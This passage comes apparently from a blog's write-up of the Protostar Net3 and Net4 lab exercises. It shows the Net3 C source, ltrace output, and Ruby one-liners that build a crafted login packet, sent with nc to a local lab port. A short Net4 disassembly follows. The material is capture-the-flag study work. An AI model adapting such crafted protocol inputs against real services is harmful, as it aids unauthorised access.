</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">send_string</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">byte</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">iovec</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">u_int16_t</span> <span class="n">len</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">expected</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">len</span> <span class="o">=</span> <span class="n">ntohs</span><span class="p">(</span><span class="mi">1</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">string</span><span class="p">));</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">;</span>
</span><span class='line'>  <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">byte</span><span class="p">;</span>
</span><span class='line'>  <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="n">string</span><span class="p">;</span>
</span><span class='line'>  <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">string</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">expected</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">string</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">writev</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">v</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">!=</span> <span class="n">expected</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">failed</span> <span class="n">to</span> <span class="n">write</span> <span class="n">correct</span> <span class="n">amount</span> <span class="n">of</span> <span class="n">bytes</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">run</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">u_int16_t</span> <span class="n">len</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">loggedin</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">len</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len</span><span class="p">));</span>
</span><span class='line'>  <span class="n">len</span> <span class="o">=</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>
</span><span class='line'>  <span class="n">buffer</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">len</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="o">!</span> <span class="n">buffer</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">malloc</span> <span class="n">failure</span> <span class="k">for</span> <span class="o">%</span><span class="n">d</span> <span class="n">bytes</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">len</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">switch</span><span class="p">(</span><span class="n">buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">case</span> <span class="mi">23</span><span class="o">:</span>
</span><span class='line'>          <span class="n">loggedin</span> <span class="o">=</span> <span class="n">login</span><span class="p">(</span><span class="n">buffer</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>          <span class="n">send_string</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="n">loggedin</span> <span class="o">?</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">successful</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">:</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">failed</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>          <span class="k">break</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span>  <span class="k">default</span><span class="o">:</span>
</span><span class='line'>      <span class="n">send_string</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="s">&quot;what you talkin about willis?&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="k">break</span><span class="p">;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">run</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>After a few tries, we got:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ ruby -e &lsquo;print [30].pack(&ldquo;n&rdquo;) + 23.chr + &ldquo;\x05&rdquo; + &ldquo;net3\x00&rdquo; + &ldquo;\x0d&rdquo; +&ldquo;awesomesauce\x00&rdquo; + &ldquo;\x09&rdquo; + &ldquo;password\x00&rdquo;&rsquo; | ltrace -f ./net3-modified
</span><span class='line'>[pid 27179] __libc_start_main(0x804895c, 1, 0xbffff874, 0x80489a0, 0x8048990 &lt;unfinished ...>
</span><span class='line'>[pid 27179] time(NULL)                                                                                                        = 1435334239
</span><span class='line'>[pid 27179] srandom(1435334239)                                                                 = &lt;void>
</span><span class='line'>[pid 27179] read(0, &ldquo;&rdquo;, 2)                                                                      = 2
</span><span class='line'>[pid 27179] ntohs(7680)                                                                         = 30
</span><span class='line'>[pid 27179] malloc(30)                                                                          = 0x0804a008
</span><span class='line'>[pid 27179] read(0, &ldquo;\027\005net3&rdquo;, 30)                                                         = 30
</span><span class='line'>[pid 27179] printf(&ldquo;%d &lt; %d\n&rdquo;, 5, 295 &lt; 29
</span><span class='line'>)                                                                                        = 7
</span><span class='line'>[pid 27179] malloc(5)                                                                           = 0x0804a030
</span><span class='line'>[pid 27179] strcpy(0x0804a030, &ldquo;net3&rdquo;)                                                          = 0x0804a030
</span><span class='line'>[pid 27179] printf(&ldquo;%d &lt; %d\n&rdquo;, 13, 2313 &lt; 23
</span><span class='line'>)                                                                                       = 8
</span><span class='line'>[pid 27179] malloc(13)                                                                          = 0x0804a040
</span><span class='line'>[pid 27179] strcpy(0x0804a040, &ldquo;awesomesauce&rdquo;)                                                  = 0x0804a040
</span><span class='line'>[pid 27179] printf(&ldquo;%d &lt; %d\n&rdquo;, 9, 99 &lt; 9
</span><span class='line'>)                                                                                         = 6
</span><span class='line'>[pid 27179] malloc(9)                                                                           = 0x0804a058
</span><span class='line'>[pid 27179] strcpy(0x0804a058, &ldquo;password&rdquo;)                                                      = 0x0804a058
</span><span class='line'>[pid 27179] strcmp(&ldquo;net3&rdquo;, &ldquo;net3&rdquo;)                                                              = 0
</span><span class='line'>[pid 27179] strcmp(&ldquo;awesomesauce&rdquo;, &ldquo;awesomesauce&rdquo;)                                              = 0
</span><span class='line'>[pid 27179] strcmp(&ldquo;password&rdquo;, &ldquo;password&rdquo;)                                                      = 0
</span><span class='line'>[pid 27179] printf(&ldquo;success: %d\n&rdquo;, 0success: 0
</span><span class='line'>)                                                                                        = 11
</span><span class='line'>[pid 27179] free(0x0804a030)                                                                    = &lt;void>
</span><span class='line'>[pid 27179] free(0x0804a040)                                                                    = &lt;void>
</span><span class='line'>[pid 27179] free(0x0804a058)                                                                    = &lt;void>
</span><span class='line'>[pid 27179] strlen(&ldquo;successful&rdquo;)                                                                = 10
</span><span class='line'>[pid 27179] ntohs(11)                                                                           = 2816
</span><span class='line'>[pid 27179] strlen(&ldquo;successful&rdquo;)                                                                = 10
</span><span class='line'>[pid 27179] strlen(&ldquo;successful&rdquo;)                                                                = 10
</span><span class='line'>[pid 27179] writev(1, 0xbffff744, 3, 0xb7f06b2c, 30
</span><span class='line'>                                                   !successful)                          = 13
</span><span class='line'>[pid 27179] +++ exited (status 13) +++</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ ruby -e &lsquo;print [30].pack(&ldquo;n&rdquo;) + 23.chr + &ldquo;\x05&rdquo; + &ldquo;net3\x00&rdquo; + &ldquo;\x0d&rdquo; +&ldquo;awesomesauce\x00&rdquo; + &ldquo;\x09&rdquo; + &ldquo;password\x00&rdquo;&rsquo; | ./net3-modified
</span><span class='line'>5 &lt; 29
</span><span class='line'>13 &lt; 23
</span><span class='line'>9 &lt; 9
</span><span class='line'>success: 0&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>!successful</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ ruby -e &lsquo;print [30].pack(&ldquo;n&rdquo;) + 23.chr + &ldquo;\x05&rdquo; + &ldquo;net3\x00&rdquo; + &ldquo;\x0d&rdquo; +&ldquo;awesomesauce\x00&rdquo; + &ldquo;\x09&rdquo; + &ldquo;password&rdquo;&rsquo; | nc 0 2996
</span><span class='line'>!successful</span></code></pre></td></tr></table></div></figure></p>

<h2>Protostar Net4</h2>

<p>This level has only the binary without description, but after disassembling we realize, that there is nothing to solve:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0804975a &lt;run>:
</span><span class='line'> 804975a:       55                      push   ebp
</span><span class='line'> 804975b:       89 e5                   mov    ebp,esp
</span><span class='line'> 804975d:       5d                      pop    ebp
</span><span class='line'> 804975e:       c3                      ret  &lt;br/></span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
</feed>
